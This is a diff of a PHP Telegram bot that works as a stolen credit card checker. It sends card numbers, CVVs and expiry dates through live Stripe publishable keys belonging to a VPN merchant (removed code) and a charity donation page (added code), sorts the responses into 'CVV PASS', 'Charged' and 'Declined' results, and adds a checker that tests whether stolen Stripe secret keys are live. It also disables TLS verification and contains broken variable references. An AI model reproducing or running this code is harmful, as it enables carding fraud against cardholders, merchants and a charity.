@@ -133,164 +133,155 @@ if(strpos($message, "/ss ") === 0 || strpos($message, "!ss ") === 0){
             	$phone = "Unavailable";
             }
             
-            $ch = curl_init();
-            curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
-            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-            curl_setopt($ch, CURLOPT_HEADER, 0);
-            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-              'Host: api.stripe.com',
-              'Accept: application/json',
-              'Accept-Language: en-US,en;q=0.9',
-              'Content-Type: application/x-www-form-urlencoded',
-              'Origin: https://js.stripe.com',
-              'Referer: https://js.stripe.com/',
-              'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'));
-            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
-            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-            curl_setopt($ch, CURLOPT_POSTFIELDS, "type=card&card[number]=$cc&card[cvc]=$cvv&card[exp_month]=$mes&card[exp_year]=$ano&billing_details[address][postal_code]=$zip&guid=$guid&muid=$muid&sid=$sid&payment_user_agent=stripe.js%2Fc478317df%3B+stripe-js-v3%2Fc478317df&time_on_page=$time&referrer=https%3A%2F%2Fatlasvpn.com%2F&key=pk_live_woOdxnyIs6qil8ZjnAAzEcyp00kUbImaXf");
-            $result1 = curl_exec($ch);
-            
-            if(stripos($result1, 'error')){
-              $errormessage = trim(strip_tags(capture($result1,'"message": "','"')));
-              $stripeerror = True;
-            }else{
-              $id = trim(strip_tags(capture($result1,'"id": "','"')));
-              $stripeerror = False;
-            }
-            
-            if(!$stripeerror){
-                $ch = curl_init();
-                curl_setopt($ch, CURLOPT_URL, 'https://user.atlasvpn.com/v1/stripe/pay');
-                curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-                curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-                  'Accept: application/json, text/plain, */*',
-                  'Accept-Language: en-US,en;q=0.9',
-                  'content-type: application/json;charset=UTF-8',
-                  'Host: user.atlasvpn.com',
-                  'Origin: https://atlasvpn.com',
-                  'Referer: https://atlasvpn.com/',
-                  'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'));
-                curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
-                curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-                
-                curl_setopt($ch, CURLOPT_POSTFIELDS, '{"email":"'.$email.''.$rand.'@gmail40.com","name":"'.$name.' '.$last.'","payment_method_id":"'.$id.'","identifier":"com.atlasvpn.vpn.subscription.p1m.stripe_regular_2","currency":"USD","postal_code":"'.$zip.'"}');
-                
-                $result2 = curl_exec($ch);
-                $errormessage = trim(strip_tags(capture($result2,'"code":"','"')));
-            }
-            $info = curl_getinfo($ch);
-            $time = $info['total_time'];
-            $time = substr_replace($time, '',4);
-
-            ###END OF CHECKER PART###
-            
-            
-            if(strpos($result2, 'client_secret')) {
-              addTotal();
-              addUserTotal($userId);
-              addCVV();
-              addUserCVV($userId);
-              addCCN();
-              addUserCCN($userId);
-              bot('editMessageText',[
-                'chat_id'=>$chat_id,
-                'message_id'=>$messageidtoedit,
-                'text'=>"<b>Card:</b> <code>$lista</code>
-<b>Status -» CVV or CCN ✅
-Response -» Approved
-Gateway -» Stripe Auth 1
-Time -» <b>$time</b><b>s</b>
-
-------- Bin Info -------</b>
-<b>Bank -»</b> $bank
-<b>Brand -»</b> $schemename
-<b>Type -»</b> $typename
-<b>Currency -»</b> $currency
-<b>Country -»</b> $cname ($emoji - 💲$currency)
-<b>Issuers Contact -»</b> $phone
-<b>----------------------------</b>
-
-<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
-<b>Bot By: <a href='t.me/ninjanaveen'>ɴɪɴᴊᴀ ɴᴀᴠᴇᴇɴ</a></b>",
-                'parse_mode'=>'html',
-                'disable_web_page_preview'=>'true'
-                
-            ]);}
-            elseif($result2 == null && !$stripeerror) {
-              addTotal();
-              addUserTotal($userId);
-              bot('editMessageText',[
-                'chat_id'=>$chat_id,
-                'message_id'=>$messageidtoedit,
-                'text'=>"<b>Card:</b> <code>$lista</code>
-<b>Status -» API Down ❌
-Response -» Unknown
-Gateway -» Stripe Auth 1
-Time -» <b>$time</b><b>s</b>
-
-------- Bin Info -------</b>
-<b>Bank -»</b> $bank
-<b>Brand -»</b> $schemename
-<b>Type -»</b> $typename
-<b>Currency -»</b> $currency
-<b>Country -»</b> $cname ($emoji - 💲$currency)
-<b>Issuers Contact -»</b> $phone
-<b>----------------------------</b>
-
-<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
-<b>Bot By: <a href='t.me/ninjanaveen'>ɴɪɴᴊᴀ ɴᴀᴠᴇᴇɴ</a></b>",
-                'parse_mode'=>'html',
-                'disable_web_page_preview'=>'true'
-                
-            ]);}
-            else{
-              addTotal();
-              addUserTotal($userId);
-              bot('editMessageText',[
-                'chat_id'=>$chat_id,
-                'message_id'=>$messageidtoedit,
-                'text'=>"<b>Card:</b> <code>$lista</code>
-<b>Status -» Dead ❌
-Response -» $errormessage
-Gateway -» Stripe Auth 1
-Time -» <b>$time</b><b>s</b>
-
-------- Bin Info -------</b>
-<b>Bank -»</b> $bank
-<b>Brand -»</b> $schemename
-<b>Type -»</b> $typename
-<b>Currency -»</b> $currency
-<b>Country -»</b> $cname ($emoji - 💲$currency)
-<b>Issuers Contact -»</b> $phone
-<b>----------------------------</b>
-
-<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
-<b>Bot By: <a href='t.me/ninjanaveen'>ɴɪɴᴊᴀ ɴᴀᴠᴇᴇɴ</a></b>",
-                'parse_mode'=>'html',
-                'disable_web_page_preview'=>'true'
-                
-            ]);}
-          
-        }else{
-          bot('editMessageText',[
-              'chat_id'=>$chat_id,
-              'message_id'=>$messageidtoedit,
-              'text'=>"<b>Cool! Fucking provide a CC to Check!!</b>",
-              'parse_mode'=>'html',
-              'disable_web_page_preview'=>'true'
               
-          ]);
-      }
-    }
+            $ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+        'authority: api.stripe.com',
+        'method: POST',
+        'path: /v1/tokens',
+        'scheme: https',
+        'accept: application/json',
+        'accept-language: en-US,en;q=0.9',
+        'content-type: application/x-www-form-urlencoded',
+        'origin: https://checkout.stripe.com',
+        'referer: https://checkout.stripe.com/',
+        'sec-fetch-dest: empty',
+        'sec-fetch-mode: cors',
+        'sec-fetch-site: same-site',
+        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36',
+        'x-requested-with: XMLHttpRequest',
+   ));
+
+   curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+(stripe.js%2F308cc4f)&user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F92.0.4515.159+Safari%2F537.36&device_id=f0b0d9b9-805b-4125-a7c7-5b414a04aa2c&referrer=https%3A%2F%2Fdonate-can.keela.co%2Fembed%2Ffoundations-for-social-change&time_checkout_opened=1629544338&time_checkout_loaded=1629544338&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[name]='.$name.'&time_on_page=&guid=bab66549-00a4-453d-bb46-c1a5b4574ae605f1ee&muid=593746ec-57dd-4c47-af62-262eb860137da6aeff&sid=f3abed8b-e4d2-4b80-bfa3-8eb3e3829f270b151a&key=pk_live_moSrTlu0TpyA6fT2puny9SWr');
+
+ $result1 = curl_exec($ch);
+ $cvc_check = trim(strip_tags(getStr($result1,'"cvc_check":"','"')));
+ $decline_check = trim(strip_tags(getStr($result1,'"decline_code":"','"')));
+ $info = curl_getinfo($ch);
+ $time = $info['total_time'];
+ $httpCode = $info['http_code'];
+ $time = substr($time, 0, 4);
+ curl_close($ch);
+
+// Responses
+
+if ((strpos($result1, 'incorrect_zip')) || (strpos($result1, 'Your card zip code is incorrect.')) || (strpos($result1, 'The zip code you supplied failed validation.'))){
+
+sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Incorrect ZIP Code </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>CVV PASS (✅)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
 }
 
+elseif ((strpos($result1, '"cvc_check":"pass"')) || (strpos($result1, "Thank You.")) || (strpos($result1, '"status": "succeeded"')) || (strpos($result1, "Thank You For Donation.")) || (strpos($result1, "Your payment has already been processed")) || (strpos($result1, "Success ")) || (strpos($result1, '"type":"one-time"')) || (strpos($result1, "/donations/thank_you?donation_number="))){
+sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Charged 9$.%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>CVV PASS (✅)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
+}
+
+elseif ((strpos($result1, 'Your card has insufficient funds.')) || (strpos($result1, 'insufficient_funds'))){
+sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Insufficient Funds. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>CVV PASS (✅)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
+}
+
+
+elseif ((strpos($result1, "Your card's security code is incorrect.")) || (strpos($result1, "incorrect_cvc")) || (strpos($result1, "The card's security code is incorrect."))){
+sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Incorrect CVC. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>CCN PASS (✅)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
+}
+
+elseif ((strpos($result1, "Your card does not support this type of purchase.")) || (strpos($result1, "transaction_not_allowed"))){
+sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code> %0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Charge Rejected. </b> %0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>CVV PASS (✅)</b> %0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
+}
+
+elseif ((strpos($result1, "pickup_card")) || (strpos($result1, "lost_card")) || (strpos($result1, "stolen_card"))){
+sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Pickup Card/Stolen Card. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>CVV PASS (✅)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
+}
+
+
+elseif (strpos($result1, "do_not_honor")){
+sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Do Not Honor. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>DECLINED (❌)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
+}
+
+elseif ((strpos($result1, 'The card number is incorrect.')) || (strpos($result1, 'Your card number is incorrect.')) || (strpos($result1, 'incorrect_number'))){
+sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Your card number is incorrect. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>Incorrect (❌)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
+}
+
+
+elseif ((strpos($result1, 'Your card has expired.')) || (strpos($result1, 'expired_card'))){
+sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Expired Card. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>Expired (❌)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
+}
+
+
+elseif ((strpos($result1, "Your card was declined.")) || (strpos($result1, 'The card was declined.'))){
+sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Your card was declined.</b> %0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>DECLINED (❌)</b> %0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
+}
+
+elseif (strpos($result1, '"decline_code": "generic_decline"')){
+sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Generic Decline. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>DECLINED (❌)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
+}
+elseif (strpos($result1, "generic_decline")){
+sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Generic Decline. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>DECLINED (❌)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
+}
+
+elseif ((strpos($result1, '"cvc_check":"unavailable"')) || (strpos($result1, '"cvc_check": "unchecked"')) || (strpos($result1, '"cvc_check": "fail"'))){
+sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Security Code Check : '.$cvc_check.' PROXY DEAD ❌</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
+}
+
+elseif (strpos($result1, 'null')){
+sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code> %0A BRAND: <b>'.$brand.'</b> %0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A MESSAGE: <b>GATE ERROR (❌)</b> %0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
+}
+
+elseif ((strpos($result1, "missing input"))){
+sendMessage($chatId, '❌Invalid Command❌%0A❗️GATE CHK AUTH%0A❗️Example: /chk xxxxxxxxxxxxxxxx|xx|xx|xxx%0A❗️EX :- /chk 4010990064374103|09|2026|345');
+}
+
+elseif(!$result2){
+sendMessage($chatId, ''.$result2.'');
+}else{
+sendMessage($chatId, ''.$result2.'');
+}
+curl_close($ch);
+}
+
+// Bonus: SK Key Checker
+
+elseif ((strpos($message, "/key") === 0)||(strpos($message, "!key") === 0)||(strpos($message, ".key") === 0)){
+$sec = substr($message, 4);
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=5278540001668044&card[exp_month]=10&card[exp_year]=2024&card[cvc]=252");
+curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
+$headers = array();
+$headers[] = 'Content-Type: application/x-www-form-urlencoded';
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+$result = curl_exec($ch);
+
+
+if (strpos($result, 'api_key_expired')){
+sendMessage($chatId, "<b>⁕ ─ 𝗦𝗞 𝗞𝗘𝗬 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 ─ ⁕</b>%0A KEY: <code>$sec</code>%0A MESSAGE: <b>Expired API key Provided.</b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>DEAD ❌</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@$username</b>%0A", $message_id);
+}elseif (strpos($result, 'Invalid API Key provided')){
+sendMessage($chatId, "<b>⁕ ─ 𝗦𝗞 𝗞𝗘𝗬 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 ─ ⁕</b>%0A KEY: <code>$sec</code>%0A MESSAGE: <b>Invalid API Key Provided.</b> %0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@$username</b>%0A", $message_id);
+}
+elseif ((strpos($result, 'You did not provide an API key.')) || (strpos($result, 'You need to provide your API key in the Authorization header,'))){
+sendMessage($chatId, "<b>⁕ ─ 𝗦𝗞 𝗞𝗘𝗬 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 ─ ⁕</b>%0A MESSAGE: <b>You did not provide an API key.</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@$username</b>%0A", $message_id);
+}
+elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
+sendMessage($chatId, "<b>⁕ ─ 𝗦𝗞 𝗞𝗘𝗬 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 ─ ⁕</b>%0A KEY: <code>$sec</code>%0A MESSAGE: <b>Testmode Charges Only.</b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>DEAD ❌</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@$username</b>%0A", $message_id);
+}else{
+sendMessage($chatId, "<b>⁕ ─ 𝗦𝗞 𝗞𝗘𝗬 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 ─ ⁕</b>%0A KEY: <code>$sec</code>%0A MESSAGE: <b>SK Key Live.</b> %0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>LIVE ✅</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@$username</b>%0A", $message_id);
+}
+}
+
+// Function
+
+function sendMessage ($chatId, $message){
+$url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
+file_get_contents($url);      
+}
 
 ?>
